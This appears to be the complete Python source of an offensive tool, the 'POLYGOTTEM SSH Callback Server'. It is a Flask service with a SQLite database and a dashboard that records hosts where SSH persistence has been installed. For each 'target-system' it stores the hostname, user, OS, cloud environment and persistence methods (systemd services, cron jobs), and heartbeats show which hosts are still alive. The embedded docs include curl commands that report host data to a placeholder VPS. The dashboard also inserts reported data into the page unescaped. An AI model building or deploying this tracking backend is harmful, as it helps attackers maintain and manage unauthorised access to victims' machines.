#!/usr/bin/env python3
"""
POLYGOTTEM SSH Callback Server
===============================
Lightweight callback server to register and verify SSH persistence installations

Features:
- HTTP/HTTPS callback endpoint
- SQLite database for persistence
- Web dashboard to view registrations
- API key authentication
- JSON response format
- Docker-ready

Author: SWORDIntel
Date: 2025-11-18
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3
import hashlib
import secrets
import json
from datetime import datetime
from pathlib import Path
import os

app = Flask(__name__)

# Configuration
DB_PATH = os.getenv('DB_PATH', '/data/ssh_callbacks.db')
API_KEY = os.getenv('API_KEY', secrets.token_urlsafe(32))  # Generate on first run
PORT = int(os.getenv('PORT', 5000))

# Print API key on startup (only if generated)
if 'API_KEY' not in os.environ:
    print(f"\n{'='*70}")
    print(f"GENERATED API KEY (save this!):")
    print(f"{API_KEY}")
    print(f"{'='*70}\n")
    print(f"Set this in your environment: export API_KEY='{API_KEY}'")
    print(f"{'='*70}\n")


def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute('''
        CREATE TABLE IF NOT EXISTS ssh_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            hostname TEXT,
            username TEXT,
            ssh_port INTEGER,
            os_type TEXT,
            os_version TEXT,
            architecture TEXT,
            environment TEXT,
            init_system TEXT,
            ssh_implementation TEXT,
            persistence_methods TEXT,
            custom_data TEXT,
            user_agent TEXT,
            verified BOOLEAN DEFAULT 0,
            last_seen TEXT
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS callback_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date TEXT NOT NULL,
            total_callbacks INTEGER DEFAULT 0,
            unique_ips INTEGER DEFAULT 0,
            successful_ssh INTEGER DEFAULT 0
        )
    ''')

    conn.commit()
    conn.close()


def verify_api_key(request_key):
    """Verify API key from request"""
    return request_key == API_KEY


@app.route('/')
def index():
    """Dashboard homepage"""
    return render_template_string(DASHBOARD_HTML)


@app.route('/api/register', methods=['POST'])
def register_callback():
    """
    Register SSH callback

    Expected JSON payload:
    {
        "api_key": "your-api-key",
        "hostname": "target-system",
        "username": "root",
        "ssh_port": 22,
        "os_type": "linux",
        "os_version": "Ubuntu 22.04",
        "architecture": "x86_64",
        "environment": "cloud_aws",
        "init_system": "systemd",
        "ssh_implementation": "openssh",
        "persistence_methods": ["systemd_service", "cron_job"],
        "custom_data": {}
    }
    """
    try:
        data = request.get_json()

        # Verify API key
        if not data or not verify_api_key(data.get('api_key', '')):
            return jsonify({
                'status': 'error',
                'message': 'Invalid or missing API key'
            }), 401

        # Get client IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Extract data
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        ssh_port = data.get('ssh_port', 22)
        os_type = data.get('os_type', 'unknown')
        os_version = data.get('os_version', 'unknown')
        architecture = data.get('architecture', 'unknown')
        environment = data.get('environment', 'unknown')
        init_system = data.get('init_system', 'unknown')
        ssh_implementation = data.get('ssh_implementation', 'unknown')
        persistence_methods = json.dumps(data.get('persistence_methods', []))
        custom_data = json.dumps(data.get('custom_data', {}))
        user_agent = request.headers.get('User-Agent', 'unknown')

        timestamp = datetime.utcnow().isoformat()

        # Insert into database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        c.execute('''
            INSERT INTO ssh_callbacks
            (timestamp, ip_address, hostname, username, ssh_port, os_type, os_version,
             architecture, environment, init_system, ssh_implementation,
             persistence_methods, custom_data, user_agent, verified, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?)
        ''', (timestamp, ip_address, hostname, username, ssh_port, os_type, os_version,
              architecture, environment, init_system, ssh_implementation,
              persistence_methods, custom_data, user_agent, timestamp))

        callback_id = c.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            'status': 'success',
            'message': 'SSH callback registered',
            'callback_id': callback_id,
            'timestamp': timestamp
        }), 200

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """
    Update last_seen timestamp for existing callback

    Expected JSON payload:
    {
        "api_key": "your-api-key",
        "hostname": "target-system",
        "ip_address": "optional-override"
    }
    """
    try:
        data = request.get_json()

        # Verify API key
        if not data or not verify_api_key(data.get('api_key', '')):
            return jsonify({
                'status': 'error',
                'message': 'Invalid or missing API key'
            }), 401

        hostname = data.get('hostname', 'unknown')
        ip_address = data.get('ip_address') or request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.utcnow().isoformat()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        c.execute('''
            UPDATE ssh_callbacks
            SET last_seen = ?
            WHERE hostname = ? AND ip_address = ?
            ORDER BY timestamp DESC
            LIMIT 1
        ''', (timestamp, hostname, ip_address))

        affected = c.rowcount
        conn.commit()
        conn.close()

        if affected > 0:
            return jsonify({
                'status': 'success',
                'message': 'Heartbeat updated',
                'timestamp': timestamp
            }), 200
        else:
            return jsonify({
                'status': 'warning',
                'message': 'No matching callback found'
            }), 404

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


@app.route('/api/callbacks', methods=['GET'])
def get_callbacks():
    """Get all callbacks (with optional API key in header)"""
    # Optional authentication for viewing
    api_key = request.headers.get('X-API-Key') or request.args.get('api_key')

    if not api_key or not verify_api_key(api_key):
        return jsonify({
            'status': 'error',
            'message': 'Invalid or missing API key'
        }), 401

    limit = int(request.args.get('limit', 100))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute('''
        SELECT id, timestamp, ip_address, hostname, username, ssh_port,
               os_type, os_version, architecture, environment, init_system,
               ssh_implementation, persistence_methods, last_seen, verified
        FROM ssh_callbacks
        ORDER BY timestamp DESC
        LIMIT ?
    ''', (limit,))

    rows = c.fetchall()
    conn.close()

    callbacks = []
    for row in rows:
        callbacks.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'hostname': row[3],
            'username': row[4],
            'ssh_port': row[5],
            'os_type': row[6],
            'os_version': row[7],
            'architecture': row[8],
            'environment': row[9],
            'init_system': row[10],
            'ssh_implementation': row[11],
            'persistence_methods': json.loads(row[12]) if row[12] else [],
            'last_seen': row[13],
            'verified': bool(row[14])
        })

    return jsonify({
        'status': 'success',
        'count': len(callbacks),
        'callbacks': callbacks
    }), 200


@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get callback statistics"""
    api_key = request.headers.get('X-API-Key') or request.args.get('api_key')

    if not api_key or not verify_api_key(api_key):
        return jsonify({
            'status': 'error',
            'message': 'Invalid or missing API key'
        }), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Total callbacks
    c.execute('SELECT COUNT(*) FROM ssh_callbacks')
    total_callbacks = c.fetchone()[0]

    # Unique IPs
    c.execute('SELECT COUNT(DISTINCT ip_address) FROM ssh_callbacks')
    unique_ips = c.fetchone()[0]

    # Verified callbacks
    c.execute('SELECT COUNT(*) FROM ssh_callbacks WHERE verified = 1')
    verified_callbacks = c.fetchone()[0]

    # Callbacks last 24h
    c.execute('''
        SELECT COUNT(*) FROM ssh_callbacks
        WHERE datetime(timestamp) > datetime('now', '-24 hours')
    ''')
    last_24h = c.fetchone()[0]

    # OS distribution
    c.execute('SELECT os_type, COUNT(*) FROM ssh_callbacks GROUP BY os_type')
    os_distribution = dict(c.fetchall())

    conn.close()

    return jsonify({
        'status': 'success',
        'stats': {
            'total_callbacks': total_callbacks,
            'unique_ips': unique_ips,
            'verified_callbacks': verified_callbacks,
            'last_24h': last_24h,
            'os_distribution': os_distribution
        }
    }), 200


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'version': '1.0.0'
    }), 200


# Dashboard HTML template
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>POLYGOTTEM SSH Callback Server</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            color: #00ff41;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2em;
            text-shadow: 0 0 10px #00ff41;
        }
        .api-key-input {
            text-align: center;
            margin-bottom: 30px;
        }
        .api-key-input input {
            background: #1a1f3a;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            width: 400px;
            font-size: 14px;
        }
        .api-key-input button {
            background: #00ff41;
            border: none;
            color: #0a0e27;
            padding: 10px 30px;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            font-weight: bold;
            margin-left: 10px;
        }
        .api-key-input button:hover { background: #00cc33; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1a1f3a;
            border: 1px solid #00ff41;
            padding: 20px;
            text-align: center;
        }
        .stat-value {
            font-size: 2.5em;
            color: #00ff41;
            font-weight: bold;
        }
        .stat-label {
            color: #7f8fa6;
            margin-top: 10px;
        }
        .callbacks-table {
            background: #1a1f3a;
            border: 1px solid #00ff41;
            overflow-x: auto;
            margin-top: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #2c3e50;
        }
        th {
            background: #00ff41;
            color: #0a0e27;
            font-weight: bold;
        }
        tr:hover { background: #232949; }
        .verified { color: #00ff41; }
        .unverified { color: #ff4757; }
        .timestamp { color: #7f8fa6; font-size: 0.9em; }
        .error { color: #ff4757; text-align: center; padding: 20px; }
        .loading { text-align: center; padding: 40px; color: #7f8fa6; }
        .endpoint-docs {
            background: #1a1f3a;
            border: 1px solid #00ff41;
            padding: 20px;
            margin-top: 30px;
        }
        .endpoint-docs h2 {
            color: #00ff41;
            margin-bottom: 15px;
        }
        .endpoint {
            background: #0f1425;
            padding: 15px;
            margin: 10px 0;
            border-left: 3px solid #00ff41;
        }
        .endpoint code {
            color: #ff6b6b;
            background: #1a1f3a;
            padding: 2px 6px;
        }
        .refresh-btn {
            background: #00ff41;
            border: none;
            color: #0a0e27;
            padding: 8px 20px;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .refresh-btn:hover { background: #00cc33; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 POLYGOTTEM SSH Callback Server</h1>

        <div class="api-key-input">
            <input type="password" id="apiKey" placeholder="Enter API Key">
            <button onclick="loadDashboard()">Load Dashboard</button>
        </div>

        <div id="content" style="display: none;">
            <div class="stats" id="stats"></div>

            <button class="refresh-btn" onclick="loadDashboard()">🔄 Refresh</button>

            <div class="callbacks-table">
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>IP Address</th>
                            <th>Hostname</th>
                            <th>OS</th>
                            <th>SSH Port</th>
                            <th>Environment</th>
                            <th>Status</th>
                            <th>Last Seen</th>
                        </tr>
                    </thead>
                    <tbody id="callbacksTable"></tbody>
                </table>
            </div>

            <div class="endpoint-docs">
                <h2>📡 API Endpoints</h2>

                <div class="endpoint">
                    <strong>POST /api/register</strong> - Register SSH callback<br>
                    <code>curl -X POST -H "Content-Type: application/json" -d '{"api_key":"YOUR_KEY","hostname":"test","os_type":"linux"}' http://YOUR_VPS:5000/api/register</code>
                </div>

                <div class="endpoint">
                    <strong>POST /api/heartbeat</strong> - Update heartbeat<br>
                    <code>curl -X POST -H "Content-Type: application/json" -d '{"api_key":"YOUR_KEY","hostname":"test"}' http://YOUR_VPS:5000/api/heartbeat</code>
                </div>

                <div class="endpoint">
                    <strong>GET /api/callbacks</strong> - Get all callbacks<br>
                    <code>curl -H "X-API-Key: YOUR_KEY" http://YOUR_VPS:5000/api/callbacks</code>
                </div>

                <div class="endpoint">
                    <strong>GET /api/stats</strong> - Get statistics<br>
                    <code>curl -H "X-API-Key: YOUR_KEY" http://YOUR_VPS:5000/api/stats</code>
                </div>
            </div>
        </div>

        <div id="error" class="error" style="display: none;"></div>
    </div>

    <script>
        async function loadDashboard() {
            const apiKey = document.getElementById('apiKey').value;
            if (!apiKey) {
                showError('Please enter API key');
                return;
            }

            try {
                // Load stats
                const statsRes = await fetch(`/api/stats?api_key=${apiKey}`);
                const statsData = await statsRes.json();

                if (statsData.status !== 'success') {
                    showError(statsData.message);
                    return;
                }

                // Load callbacks
                const callbacksRes = await fetch(`/api/callbacks?api_key=${apiKey}`);
                const callbacksData = await callbacksRes.json();

                // Display stats
                const statsHtml = `
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.total_callbacks}</div>
                        <div class="stat-label">Total Callbacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.unique_ips}</div>
                        <div class="stat-label">Unique IPs</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.verified_callbacks}</div>
                        <div class="stat-label">Verified</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.last_24h}</div>
                        <div class="stat-label">Last 24 Hours</div>
                    </div>
                `;
                document.getElementById('stats').innerHTML = statsHtml;

                // Display callbacks table
                const tableRows = callbacksData.callbacks.map(cb => `
                    <tr>
                        <td class="timestamp">${new Date(cb.timestamp).toLocaleString()}</td>
                        <td>${cb.ip_address}</td>
                        <td>${cb.hostname}</td>
                        <td>${cb.os_type} ${cb.os_version}</td>
                        <td>${cb.ssh_port}</td>
                        <td>${cb.environment}</td>
                        <td class="${cb.verified ? 'verified' : 'unverified'}">
                            ${cb.verified ? '✓ Verified' : '✗ Unverified'}
                        </td>
                        <td class="timestamp">${new Date(cb.last_seen).toLocaleString()}</td>
                    </tr>
                `).join('');

                document.getElementById('callbacksTable').innerHTML = tableRows || '<tr><td colspan="8" style="text-align: center;">No callbacks yet</td></tr>';

                document.getElementById('content').style.display = 'block';
                document.getElementById('error').style.display = 'none';

            } catch (error) {
                showError('Failed to load dashboard: ' + error.message);
            }
        }

        function showError(message) {
            document.getElementById('error').textContent = message;
            document.getElementById('error').style.display = 'block';
            document.getElementById('content').style.display = 'none';
        }

        // Load on Enter key
        document.getElementById('apiKey').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') loadDashboard();
        });
    </script>
</body>
</html>
'''


if __name__ == '__main__':
    # Initialize database
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    init_db()

    print(f"Starting SSH Callback Server on port {PORT}...")
    print(f"Database: {DB_PATH}")
    print(f"Dashboard: http://0.0.0.0:{PORT}/")

    app.run(host='0.0.0.0', port=PORT, debug=False)
